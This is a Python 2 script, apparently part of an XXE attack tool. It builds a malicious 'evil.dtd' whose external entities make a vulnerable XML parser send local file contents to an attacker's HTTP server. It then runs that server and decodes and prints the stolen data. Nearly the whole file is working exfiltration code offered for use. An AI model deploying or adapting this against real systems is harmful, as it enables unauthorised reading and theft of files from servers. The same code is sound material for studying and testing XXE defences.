#!/usr/bin/env python

from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
from hashlib import sha1
import sys, os
import urllib

DTD_NAME = "evil.dtd"
DTD_TEMPLATE = """
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://{}:{}/?%file;'>">
%all;
%send;
"""

LAST_CONTENTS = ''

def makeCustomHandlerClass(dtd_name, dtd_contents, isb64):
    '''class factory method for injecting custom args into handler class. 
    see here for more info: http://stackoverflow.com/questions/21631799/how-can-i-pass-parameters-to-a-requesthandler'''
    class xxeHandler(BaseHTTPRequestHandler, object):
        def __init__(self, *args, **kwargs):
            self.DTD_NAME = dtd_name
            self.DTD_CONTENTS = dtd_contents
            self.ISB64 = isb64
            super(xxeHandler, self).__init__(*args, **kwargs)
            
        def log_message(self, format, *args):
            '''overwriting this method to silence stderr output'''
            return
    
        def do_GET(self):
            if self.path.endswith(self.DTD_NAME): #need to actually serve DTD here
                mimetype = 'application/xml-dtd'
                self.send_response(200)
                self.send_header('Content-type',mimetype)
                self.end_headers()
                self.wfile.write(self.DTD_CONTENTS)
        
            else: #assume it's file contents and spit it out
                if self.path[0:2] == '/?': #hacky way to get rid of beginning chars
                    contents = self.path[2:]
                else:
                    contents = self.path
                displayContents(contents, self.ISB64)
                self.send_response(200)
                self.end_headers()
                self.wfile.write("") #have to respond w/ something so it doesnt timeout
            
            return
        
    return xxeHandler #return class
    

def displayContents(contents, isBase64=False):
    '''my hacky way to not display duplicate contents. 
    for some reason xml sends back to back requests
    and i only want to show the first one'''
    global LAST_CONTENTS
    newContents = sha1(contents).hexdigest()
    if LAST_CONTENTS != newContents:
        print "[+] Received response, displaying\n"
        if not isBase64:
            print urllib.unquote(contents)
        else:
            print urllib.unquote(contents).decode('base64')
        LAST_CONTENTS = newContents
        print "------\n"
    return
    
  
def startServer(ip, port=8000, isb64=False):
    try:
        DTD_CONTENTS = DTD_TEMPLATE.format(ip, port)
        xxeHandler = makeCustomHandlerClass(DTD_NAME, DTD_CONTENTS, isb64)
        server = HTTPServer((ip, port), xxeHandler)
        #touches a file to let the other process know the server is running. super hacky
        with open('.server_started','w') as check:
            check.write('true')
        print '\n[+] started server on {}:{}'.format(ip,port)
        print '\n[+] Request away. Happy hunting.'
        print '[+] press Ctrl-C to close\n'
        server.serve_forever()

    except KeyboardInterrupt:
        print "\n...shutting down"
        if os.path.exists('.server_started'):
            os.remove('.server_started')
        server.socket.close()
        
def usage():
    print "Usage: {} <ip> <port>".format(sys.argv[0])

        
    